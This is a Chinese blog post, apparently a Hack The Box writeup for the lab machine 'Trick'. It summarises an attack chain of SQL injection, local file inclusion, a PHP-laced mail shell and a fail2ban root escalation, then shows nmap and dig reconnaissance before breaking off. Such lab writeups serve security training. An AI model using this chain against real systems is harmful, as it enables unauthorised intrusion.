

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="0x00 靶场技能介绍章节技能：DNS枚举、SQL注入、万能密码、本地文件包含、ssh秘钥读取、fail2ban、木马邮件shell">
<meta property="og:type" content="article">
<meta property="og:title" content="Trick-htb-writeup">
<meta property="og:url" content="https://sh1yan.top/2024/09/25/Trick-htb-writeup/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="0x00 靶场技能介绍章节技能：DNS枚举、SQL注入、万能密码、本地文件包含、ssh秘钥读取、fail2ban、木马邮件shell">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/1.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/2.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/3.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/4.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/5.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/6.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/7.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/8.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/9.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/10.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/11.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/12.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/13.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/14.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/15.png">
<meta property="og:image" content="http://sh1yan.top/photo/Trick-htb-writeup/16.png">
<meta property="article:published_time" content="2024-09-25T15:50:55.000Z">
<meta property="article:modified_time" content="2025-02-26T03:47:19.909Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="shooting-range">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://sh1yan.top/photo/Trick-htb-writeup/1.png">
  
  
  
  <title>Trick-htb-writeup - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
                    
                    <span>SQLMap命令生成器</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/cvssjs/" target="_self">
                    
                    <span>CVSSv3.1 漏洞评分</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Trick-htb-writeup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-25 23:50" pubdate>
          2024年9月25日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          60k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          496 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Trick-htb-writeup</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：DNS枚举、SQL注入、万能密码、本地文件包含、ssh秘钥读取、fail2ban、木马邮件shell</p>
<span id="more"></span>  

<p>参考链接：<code>https://sidthoviti.com/trick-hackthebox-writeup/</code></p>
<p>参考链接：<code>https://0xdf.gitlab.io/2022/10/29/htb-trick.html</code></p>
<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍</p>
<p><code>关于Trick</code><br><code>Trick 是一台 Easy Linux 机器，具有 DNS 服务器和多个 vHost，它们都需要各种步骤才能立足。它需要 DNS 的基本知识才能获得域名，然后是可用于访问第一个 vHost 的子域。在第一个 vHost 上，我们看到了一个易受 SQL 注入攻击的工资管理系统。使用“sqlmap”，我们发现我们拥有文件权限，可以读取系统文件。读取 Nginx 配置文件会显示另一个 vHost。此 vHost 包含一个可被利用的本地文件包含 (LFI) 漏洞。向其中一个用户发送嵌入 PHP 代码的邮件，然后将该邮件与 LFI 一起包含，可实现远程代码执行 (RCE)。在初始立足点之后，我们发现了一个无需密码即可执行的 Sudo 命令。该命令重新启动“fail2ban”服务。fail2ban 的配置目录包含一个目录，该目录由当前用户所属的组拥有。用户具有该目录的写权限，并可以重命名配置文件并将其替换为自己的文件，一旦触发禁令，就会导致以 root 身份执行远程代码。</code></p>
<p>2、测试下靶机的连通率</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿offsec)-[~/Desktop]<br>└─$<span class="hljs-built_in"> ping </span>10.10.11.166 -c 4<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>10.10.11.166 (10.10.11.166) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.166: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=852 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.166: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=163 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.166: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=179 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.166: <span class="hljs-attribute">icmp_seq</span>=4 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=188 ms<br><br>--- 10.10.11.166<span class="hljs-built_in"> ping </span>statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3030ms<br>rtt min/avg/max/mdev = 163.013/345.346/852.213/292.771 ms<br></code></pre></td></tr></table></figure>

<p>3、获取下开放端口情况</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stata">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- -Pn 10.10.11.166 --min-rate=10000     <br>[sudo] kali 的密码：<br>Starting Nmap 7.94SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-09-25 10:32 CST</span><br>Warning: 10.10.11.166 giving up <span class="hljs-keyword">on</span> port because retransmission <span class="hljs-keyword">cap</span> hit (10).<br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> 10.10.11.166<br>Host is up (1.3s latency).<br>Not shown: 64700 closed tcp ports (reset), 831 filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE<br>22/tcp <span class="hljs-keyword">open</span>  ssh<br>25/tcp <span class="hljs-keyword">open</span>  smtp<br>53/tcp <span class="hljs-keyword">open</span>  domain<br>80/tcp <span class="hljs-keyword">open</span>  http<br><br>Nmap done: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 63.67 seconds<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,25,53,80 -<span class="hljs-keyword">sC</span> -sV -Pn 10.10.11.166 --min-rate=10000<br>Starting Nmap 7.94SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-09-25 10:33 CST</span><br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> 10.10.11.166<br>Host is up (0.16s latency).<br><br>PORT   STATE SERVICE <span class="hljs-keyword">VERSION</span><br>22/tcp <span class="hljs-keyword">open</span>  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 61:ff:29:3b:36:bd:9d:<span class="hljs-keyword">ac</span>:fb:<span class="hljs-keyword">de</span>:1f:56:88:4c:ae:2d (RSA)<br>|   256 9e:<span class="hljs-keyword">cd</span>:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)<br>|_  256 72:93:f9:11:58:<span class="hljs-keyword">de</span>:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)<br>25/tcp <span class="hljs-keyword">open</span>  smtp?<br>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING<br>53/tcp <span class="hljs-keyword">open</span>  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)<br>| dns-nsid: <br>|_  bind.<span class="hljs-keyword">version</span>: 9.11.5-P4-5.1+deb10u7-Debian<br>80/tcp <span class="hljs-keyword">open</span>  http    nginx 1.14.2<br>|_http-title: Coming Soon - Start <span class="hljs-keyword">Bootstrap</span> Theme<br>|_http-server-header: nginx/1.14.2<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please <span class="hljs-keyword">report</span> any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 229.82 seconds<br></code></pre></td></tr></table></figure>

<p>4、这里没有发现新增域名地址，还是比较奇怪的，那继续测试下53端口瞅瞅</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-string">CH</span> <span class="hljs-string">TXT</span> <span class="hljs-string">version.bind</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> <br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.19</span><span class="hljs-number">.21</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">CH</span> <span class="hljs-string">TXT</span> <span class="hljs-string">version.bind</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">SERVFAIL,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">21239</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">512</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;version.bind.</span>                  <span class="hljs-string">CH</span>      <span class="hljs-string">TXT</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">106</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-comment">#53(8.8.8.8) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-string">:50:14</span> <span class="hljs-string">CST</span> <span class="hljs-number">2024</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">41</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">SERVFAIL,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">45275</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">512</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;10.10.11.166.</span>                  <span class="hljs-string">CH</span>      <span class="hljs-string">TXT</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">78</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-comment">#53(8.8.8.8) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-string">:50:14</span> <span class="hljs-string">CST</span> <span class="hljs-number">2024</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">41</span><br><br>                                                                                                                                                           <br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">fierce</span> <span class="hljs-string">--domain</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span><br><span class="hljs-attr">NS:</span> <span class="hljs-string">failure</span><br><span class="hljs-attr">SOA:</span> <span class="hljs-string">failure</span><br><span class="hljs-string">Failed</span> <span class="hljs-string">to</span> <span class="hljs-string">lookup</span> <span class="hljs-string">NS/SOA,</span> <span class="hljs-string">Domain</span> <span class="hljs-string">does</span> <span class="hljs-string">not</span> <span class="hljs-string">exist</span><br>                                                                                                                                                           <br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-string">-x</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.19</span><span class="hljs-number">.21</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">-x</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NXDOMAIN,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">48814</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">512</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;166.11.10.10.in-addr.arpa.</span>     <span class="hljs-string">IN</span>      <span class="hljs-string">PTR</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query time:</span> <span class="hljs-number">118</span> <span class="hljs-string">msec</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">SERVER:</span> <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span><span class="hljs-comment">#53(8.8.8.8) (UDP)</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">WHEN:</span> <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-string">:51:43</span> <span class="hljs-string">CST</span> <span class="hljs-number">2024</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">MSG SIZE  rcvd:</span> <span class="hljs-number">54</span><br><br>                                                                                                                                                           <br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">dig</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> <span class="hljs-string">A</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.19</span><span class="hljs-number">.21</span><span class="hljs-number">-1</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> <span class="hljs-string">A</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NXDOMAIN,</span> 